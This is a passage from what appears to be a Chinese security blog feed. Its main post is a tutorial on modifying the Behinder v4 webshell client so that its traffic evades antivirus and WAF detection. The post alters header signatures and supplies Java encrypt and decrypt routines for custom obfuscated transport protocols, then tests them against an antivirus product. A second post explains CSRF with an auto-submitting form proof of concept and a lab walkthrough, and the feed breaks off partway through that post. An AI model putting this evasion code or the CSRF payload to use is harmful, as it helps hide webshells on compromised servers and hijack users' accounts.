    <content type="html"><![CDATA[<h2 id="Behinder介绍"><a href="#Behinder介绍" class="headerlink" title="Behinder介绍"></a>Behinder介绍</h2><p>“冰蝎”(Behinder)是一个动态二进制加密网站管理客户端，相比较于传统的老牌工具“菜刀”而言，对webshell的流量进行了相应的加密。”冰蝎”客户端基于JAVA，所以可以跨平台使用，随着版本的升级，兼容性也随之提升。主要功能为：基本信息、命令执行、虚拟终端、文件管理、Socks代理、反弹shell、数据库管理、自定义代码等，功能非常强大，是现如今必不可少的渗透测试工具之一</p><h2 id="时光荏苒"><a href="#时光荏苒" class="headerlink" title="时光荏苒"></a>时光荏苒</h2><p>攻防技术一直都在不断发展的，随着防守技术日趋成熟和完善，攻击手段也就需要不断地更新、创新。而”冰蝎”早已不再更新。因此现已被各大厂商的检测系统及WAF对其特征进行了记载与分析，所以这也是为什么在实战中经常碰到“落地成盒”的原因，马子刚传上去就die了, 就更别说拿shell了。因此我们需要在原版的基础上进行改造从而适应当今全新的攻防世界</p><h2 id="魔改"><a href="#魔改" class="headerlink" title="魔改"></a>魔改</h2><p>可以通过更改流量特征以及添加自己的加密协议，从而达到免杀的效果，因为强特征很容易被杀毒软件识别，当我们修改了特征它就无法判断是否为恶意流量，更改协议也是一个道理，杀毒软件病毒库里面已经存放了冰蝎中内置的6个加密协议，所以需要我们自定义协议来绕过查杀，而冰蝎v4开放了传输协议的自定义功能，使得流量魔改更为简单方便</p><p>首先将冰蝎的jar包进行反编译拿到源码</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_23-37.png" class="" title="2024-02-08_23-37.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>拿到源码之后，新建一个目录把源码和冰蝎4（单放在一个目录里面）放在同一目录</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_22-29.png" class="" title="2024-02-08_22-29.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_22-29_1.png" class="" title="2024-02-08_22-29_1.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>打开ide，在刚才的目录中创建一个新项目，并将冰蝎的jar包导入模块中，并设置好主类，这里的主类一定不要弄错：net.rebeyond.behinder.ui<br>（注：jdk版本1.8，并且还要把原文件中的数据库文件复制到主文件中，否则过会运行会报错）</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-09_14-09.png" class="" title="2024-02-09_14-09.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>在修改之前，我们先看一下behinder数据包原先的样子</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-09_14-16.png" class="" title="2024-02-09_14-16.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>其中Accept、Accept-Language特征最为明显，并且UA头是内置的且随机，所以考虑先把一些强特征进行修改，要注意的是：所有的修改不能直接在文件中改需要把整个路径复制到src文件中，把不需要修改的文件可以删掉，不然构建的时候会很慢</p><p>我们通过accept特征进行全局搜索，找到了net下的constants文件，而数据包中ua特征和其他特征都在shell文件中，因此就先对这两个文件进行魔改</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_09-19.png" class="" title="2024-02-08_09-19.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_20-20.png" class="" title="2024-02-08_20-20.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_20-38.png" class="" title="2024-02-08_20-38.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_20-39.png" class="" title="2024-02-08_20-39.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>并且冰蝎中有个固定的Content-type字段：Content-type: application&#x2F;x-www-form-urlencoded</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_20-52.png" class="" title="2024-02-08_20-52.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>同样这个特征也可以改，因为这里只有php和aspx的，我们可以添加上jsp和asp</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_20-55.png" class="" title="2024-02-08_20-55.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>全部改完之后，构建工程和模块重新运行一下看看结果</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_20-41.png" class="" title="2024-02-08_20-41.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_20-15.png" class="" title="2024-02-08_20-15.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_20-42.png" class="" title="2024-02-08_20-42.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>可以发现基本的强特征都已经被修改，数据包中的ua头和其他关键特征也已经被修改。接下来对数据协议进行自定义加密，绕过主流杀软和waf等安全设备的检测，冰蝎4内置了六种传输协议，但早已被记载</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_21-49.png" class="" title="2024-02-08_21-49.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>这里分享两种加密，第一种是key-value格式+unicode加密，以jsp脚本类型为例<br>加密</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] Encrypt(<span class="hljs-type">byte</span>[] data) <span class="hljs-keyword">throws</span> Exception &#123;<br> <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;id=1&amp;content=DaYer0&amp;token=1452178369&amp;status=00000&quot;</span>;<br> <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span><br>java.util.Base64.getEncoder().encodeToString(data).replace(<span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;&lt;&quot;</span>).replace(<span class="hljs-string">&quot;/&quot;</span>,<br><span class="hljs-string">&quot;&gt;&quot;</span>);<br> <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br> <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">unicode</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br> <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; result.length(); i++) &#123;<br>   <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> result.charAt(i);<br>   unicode.append(<span class="hljs-string">&quot;\\u00&quot;</span> + Integer.toHexString(c));<br> &#125;<br> content = content.replace(<span class="hljs-string">&quot;DaYer0&quot;</span>, unicode.toString());<br><br> <span class="hljs-comment">// ROT13 encryption</span><br> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">encryptedContent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br> <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; content.length(); i++) &#123;<br>   <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> content.charAt(i);<br>   <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">&#x27;a&#x27;</span> &amp;&amp; c &lt;= <span class="hljs-string">&#x27;z&#x27;</span>) &#123;<br>     c = (<span class="hljs-type">char</span>) (((c - <span class="hljs-string">&#x27;a&#x27;</span>) + <span class="hljs-number">13</span>) % <span class="hljs-number">26</span> + <span class="hljs-string">&#x27;a&#x27;</span>);<br>   &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp; c &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>) &#123;<br>     c = (<span class="hljs-type">char</span>) (((c - <span class="hljs-string">&#x27;A&#x27;</span>) + <span class="hljs-number">13</span>) % <span class="hljs-number">26</span> + <span class="hljs-string">&#x27;A&#x27;</span>);<br>   &#125;<br>   encryptedContent.append(c);<br> &#125;<br> <span class="hljs-keyword">return</span> encryptedContent.toString().getBytes();<br>&#125;<br></code></pre></td></tr></table></figure><p>解密</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] Decrypt(<span class="hljs-type">byte</span>[] data) <span class="hljs-keyword">throws</span> Exception &#123;<br> <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(data);<br> <span class="hljs-comment">// Reverse ROT13 decryption</span><br> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">decryptedContent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br> <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; content.length(); i++) &#123;<br>   <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> content.charAt(i);<br>   <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">&#x27;a&#x27;</span> &amp;&amp; c &lt;= <span class="hljs-string">&#x27;z&#x27;</span>) &#123;<br>     c = (<span class="hljs-type">char</span>) (((c - <span class="hljs-string">&#x27;a&#x27;</span>) + <span class="hljs-number">13</span>) % <span class="hljs-number">26</span> + <span class="hljs-string">&#x27;a&#x27;</span>);<br>   &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp; c &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>) &#123;<br>     c = (<span class="hljs-type">char</span>) (((c - <span class="hljs-string">&#x27;A&#x27;</span>) + <span class="hljs-number">13</span>) % <span class="hljs-number">26</span> + <span class="hljs-string">&#x27;A&#x27;</span>);<br>   &#125;<br>   decryptedContent.append(c);<br> &#125;<br><br> <span class="hljs-type">String</span> <span class="hljs-variable">decodedString</span> <span class="hljs-operator">=</span> decryptedContent.toString();<br> java.io.<span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.ByteArrayOutputStream();<br> bos.write(decodedString.getBytes(), <span class="hljs-number">13</span>, decodedString.length() - <span class="hljs-number">43</span>);<br> <span class="hljs-type">String</span> <span class="hljs-variable">unicode</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bos.toByteArray());<br> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br> <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br> <span class="hljs-type">int</span> <span class="hljs-variable">pos</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br> <span class="hljs-keyword">while</span> ((i = unicode.indexOf(<span class="hljs-string">&quot;\\u&quot;</span>, pos)) != -<span class="hljs-number">1</span>) &#123;<br>   sb.append(unicode.substring(pos, i));<br>   <span class="hljs-keyword">if</span> (i + <span class="hljs-number">5</span> &lt; unicode.length()) &#123;<br>     pos = i + <span class="hljs-number">6</span>;<br>     sb.append((<span class="hljs-type">char</span>) Integer.parseInt(unicode.substring(i + <span class="hljs-number">2</span>, i + <span class="hljs-number">6</span>),<br><span class="hljs-number">16</span>));<br>   &#125;<br> &#125;<br> <span class="hljs-type">byte</span>[] decryptedData =<br>java.util.Base64.getDecoder().decode(sb.toString().replace(<span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>).replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<br><span class="hljs-string">&quot;/&quot;</span>));<br> <span class="hljs-keyword">return</span> decryptedData;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后可以使用冰蝎的传输协议进行测试，如果提示“保存成功”就说明解密加密一致</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_21-22.png" class="" title="2024-02-08_21-22.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>修改完后同样的我们要把文件放在src目录下，确保文件和之前所在目录一致，我们生成服务端测试一下效果</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-09_15-13.png" class="" title="2024-02-09_15-13.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><p>可以看到流量包中的数据已经被加密。第二种是multipart格式+hex加密<br>加密</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] <span class="hljs-title function_">Encrypt</span>(<span class="hljs-type">byte</span>[] data) <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    <span class="hljs-built_in">String</span> upload=<span class="hljs-string">&quot;-----------------------------7e6103b1815de Content-Disposition:form-data;name=\&quot;uploadFile\&quot;;filename=\&quot;test.png\&quot; Content-Type:application/octet-stream  DaYer0 -----------------------------7e6103b1815de--&quot;</span>;<br>    <span class="hljs-built_in">String</span> <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-built_in">String</span> result = java.<span class="hljs-property">util</span>.<span class="hljs-property">Base64</span>.<span class="hljs-property">getEncoder</span>().<span class="hljs-property">encodeToString</span>(data).<span class="hljs-property">replace</span>(<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;&lt;&quot;</span>).<span class="hljs-property">replace</span>(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;&gt;&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;result.<span class="hljs-property">length</span>();i++)&#123;<br>        <span class="hljs-type">int</span> ch = (<span class="hljs-type">int</span>)result.<span class="hljs-property">charAt</span>(i);<br>        <span class="hljs-built_in">String</span> s4 = Integer.<span class="hljs-property">toHexString</span>(ch);<br>        <span class="hljs-built_in">str</span> = <span class="hljs-built_in">str</span> + s4;<br>    &#125;<br>    upload=upload.<span class="hljs-property">replace</span>(<span class="hljs-string">&quot;DaYer0&quot;</span>,<span class="hljs-built_in">str</span>);<br>    <span class="hljs-keyword">return</span> upload.<span class="hljs-property">getBytes</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>解密</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">private</span> <span class="hljs-keyword">byte</span>[] Decrypt(<span class="hljs-keyword">byte</span>[] data) <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    java.io.ByteArrayOutputStream bos=<span class="hljs-keyword">new</span> java.io.ByteArrayOutputStream();<br>    bos.<span class="hljs-keyword">write</span>(data,<span class="hljs-number">150</span>,data.length-<span class="hljs-number">195</span>);<br>        String s= <span class="hljs-keyword">new</span> String(bos.toByteArray());<br>        <span class="hljs-keyword">byte</span>[] baKeyword = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[s.length()/<span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; baKeyword.length; i++)&#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            baKeyword[i] = (<span class="hljs-keyword">byte</span>)(<span class="hljs-number">0</span>xff &amp; Integer.parseInt(s.substring(i*<span class="hljs-number">2</span>, i*<span class="hljs-number">2</span>+<span class="hljs-number">2</span>),<span class="hljs-number">16</span>));<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        &#125;<br>        <span class="hljs-keyword">try</span>&#123;<br>        s = <span class="hljs-keyword">new</span> String(baKeyword, <span class="hljs-string">&quot;utf-8&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e1)&#123;<br>        e1.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> java.util.Base64.getDecoder().decode(s.replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;+&quot;</span>).replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>));<br><br>&#125;<br></code></pre></td></tr></table></figure><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-09_15-22.png" class="" title="2024-02-09_15-22.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><p>测试一下效果</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-09_15-27.png" class="" title="2024-02-09_15-27.png"><h6 id="-18"><a href="#-18" class="headerlink" title=""></a></h6><p>最后做一下免杀测试，因为我的win虚拟机上就装了一个火绒，就先做火绒的测试吧，其他自测就好</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/688463846a03d520af12793620365b4.png" class="" title="688463846a03d520af12793620365b4.png">]]></content>
    
    
    <categories>
      
      <category>瞎搞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>test</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSRF总结</title>
    <link href="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/"/>
    <url>/2024/02/06/CSRF%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="CSRF介绍"><a href="#CSRF介绍" class="headerlink" title="CSRF介绍"></a>CSRF介绍</h2><p>跨站请求伪造（Cross-site request forgery，简称CSRF），一种常见的web安全漏洞，攻击者利用受害者身份发起了HTTP请求，导致受害者在不知情的情况下进行了业务操作；它允许攻击者部分规避同源策略，该策略旨在防止不同网站相互干扰，并且由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行，简单来说就是你点击我构造的恶意链接，我就可以以你的名义去发起一个http请求。常见的漏洞利用场景：修改资料、提交订单、发布留言或评论等，并且在Web应用中，用户登录后执行的操作中有些处理一旦完成就无法撤销，比如用户使用信用卡支付、从用户的银行账号转账、发送邮件、更改密码或邮箱地址等都成为了CSRF的典型攻击案例</p><h2 id="CSRF主要的攻击形式"><a href="#CSRF主要的攻击形式" class="headerlink" title="CSRF主要的攻击形式"></a>CSRF主要的攻击形式</h2><p>① GET类型的CSRF</p><p>这类攻击非常简单，只需要构造一个HTTP请求，即可完成攻击</p><p>② POST类型的CSRF<br>这种类型的 CSRF 利用起来通常使用的是一个自动提交的表单，访问问该页面后，表单会自动提交，相当于模拟用户完成了一次 POST 操作。可见这种类型的 CSRF 与第一种一样，都是模拟请求，所以后端接口也不能将安全寄托在仅允许 POST 请求上</p><p>③ 链接类型的 CSRF<br>链接类型的CSRF并不常见，比起其他两种用户打开页面就中招的情况，这种类型需要用户点击链接才会触发，但本质上与前两种一样。这种类型通常是在论坛发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：&lt;a href&#x3D;” taget&#x3D;”_blank”&gt; 由于之前用户登录了信任的网站A，并且保存登录状态，只要用户主动访问这个页面，则表示攻击成功</p><h2 id="CSRF漏洞原理"><a href="#CSRF漏洞原理" class="headerlink" title="CSRF漏洞原理"></a>CSRF漏洞原理</h2><h3 id="CSRF漏洞产生的原因"><a href="#CSRF漏洞产生的原因" class="headerlink" title="CSRF漏洞产生的原因"></a>CSRF漏洞产生的原因</h3><p>(1)http协议使用session在服务端保存用户的个人信息,客户端浏览器用cookie标识用户身份;</p><p>(2)cookie的认证只能确保是某个用户发送的请求,但是不能保证这个请求是否是”用户自愿的行为”.</p><p>(3)这时,用户登录了某个web站点,同时点击了包含CSRF恶意代码的URL,就会触发CSRF</p><h3 id="漏洞利用的条件"><a href="#漏洞利用的条件" class="headerlink" title="漏洞利用的条件"></a>漏洞利用的条件</h3><p>(1)用户必须登录A网站,生成了cookie</p><p>(2)登录的同时访问了恶意URL(包含CSRF恶意代码的URL).</p><h3 id="原理图"><a href="#原理图" class="headerlink" title="原理图"></a>原理图</h3><p>为了方便理解，可以看一下我下面做的这个流程图</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/ae23ebf70d53939f7ed0052a3576698.png" class="" title="ae23ebf70d53939f7ed0052a3576698.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>例如，假设应用程序包含一个允许用户更改其帐户上的电子邮件地址的功能。当用户执行此操作时，他们会发出如下一个 HTTP 请求：</p><p>POST &#x2F;email&#x2F;change HTTP&#x2F;1.1<br>Host: vulnerable-website.com<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 30<br>Cookie: session&#x3D;yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE</p><p>email&#x3D;<a href="mailto:&#119;&#x69;&#x65;&#x6e;&#x65;&#114;&#64;&#110;&#111;&#x72;&#x6d;&#x61;&#108;&#45;&#x75;&#x73;&#101;&#114;&#x2e;&#x63;&#x6f;&#109;">&#119;&#x69;&#x65;&#x6e;&#x65;&#114;&#64;&#110;&#111;&#x72;&#x6d;&#x61;&#108;&#45;&#x75;&#x73;&#101;&#114;&#x2e;&#x63;&#x6f;&#109;</a></p><p>这满足了CSRF所需的条件：<br>1、攻击者通常能够触发密码重置并完全控制用户的帐户<br>2、应用程序使用会话 cookie 来识别发出请求的用户<br>3、攻击者可以轻松执行、修改操作所需的请求参数的值</p><p>具备这些条件后，攻击者就可以构建包含以下 HTML 的网页：</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://vulnerable-website.com/email/change&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;pwned@evil-user.net&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-number">0</span>].<span class="hljs-title function_">submit</span>();</span><br><span class="language-javascript">        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如果受害者用户访问攻击者的网页，将会发生以下情况：</p><p>攻击者的页面将触发对易受攻击的网站的 HTTP 请求。<br>如果用户登录到易受攻击的网站，他们的浏览器将自动在请求中包含其会话 cookie<br>并且该网站将以正常方式处理该请求，视为由受害用户正常发出，却成功的更改了电子邮件地址<br>SUCCCESS！</p><p>参考文章：<br><a href="https://www.freebuf.com/articles/web/247866.html">https://www.freebuf.com/articles/web/247866.html</a><br><a href="https://developer.aliyun.com/article/1207187">https://developer.aliyun.com/article/1207187</a><br><a href="https://www.cnblogs.com/jingdongkeji/p/17799878.html">https://www.cnblogs.com/jingdongkeji/p/17799878.html</a></p><h2 id="CSRF漏洞常见利用方式"><a href="#CSRF漏洞常见利用方式" class="headerlink" title="CSRF漏洞常见利用方式"></a>CSRF漏洞常见利用方式</h2><p>下面我将用burpsuite官方靶场环境来做演示</p><h3 id="无防御措施的CSRF漏洞"><a href="#无防御措施的CSRF漏洞" class="headerlink" title="无防御措施的CSRF漏洞"></a>无防御措施的CSRF漏洞</h3><p>首先使用提供的账号密码登录实验室 wiener:peter</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_20-22.png" class="" title="2024-02-05_20-22.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>可以看到此时默认邮箱是 <a href="mailto:&#119;&#105;&#101;&#x6e;&#x65;&#114;&#64;&#x6e;&#x6f;&#114;&#109;&#x61;&#x6c;&#x2d;&#x75;&#115;&#101;&#114;&#x2e;&#110;&#x65;&#116;">&#119;&#105;&#101;&#x6e;&#x65;&#114;&#64;&#x6e;&#x6f;&#114;&#109;&#x61;&#x6c;&#x2d;&#x75;&#115;&#101;&#114;&#x2e;&#110;&#x65;&#116;</a> ，我们先随便模拟修改邮箱账号修改一个并抓个包</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_20-25.png" class="" title="2024-02-05_20-25.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>我们可以看到，数据包中只提交了一个修改后的邮箱数据，这里我们可以直接使用 burp 自带的功能来生成 POC，把邮箱修改成我们想要的攻击效果，也就是只需要修改 value 中的值就可以了</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_20-26_1.png" class="" title="2024-02-05_20-26_1.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>然后将生成的攻击链接 copy 一下，然后在同一个浏览器打开，来模拟受害者点击我们传播的 url 即可，此时可以看到邮箱修改成功，则表示攻击成功</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_20-28.png" class="" title="2024-02-05_20-28.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_20-32.png" class="" title="2024-02-05_20-32.png"><h3 id="有防护的CSRF漏洞（常见绕过）"><a href="#有防护的CSRF漏洞（常见绕过）" class="headerlink" title="有防护的CSRF漏洞（常见绕过）"></a>有防护的CSRF漏洞（常见绕过）</h3><h4 id="未限制请求方法"><a href="#未限制请求方法" class="headerlink" title="未限制请求方法"></a>未限制请求方法</h4><p>还是刚才修改邮箱场景的靶场环境，首先我们先抓包看看数据包，分析一下修改邮箱怎么实现的</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-09.png" class="" title="2024-02-05_21-09.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>这里我们可以看到是存在一个 CSRF token 的，我们删了它看看是否会走校验</p><img 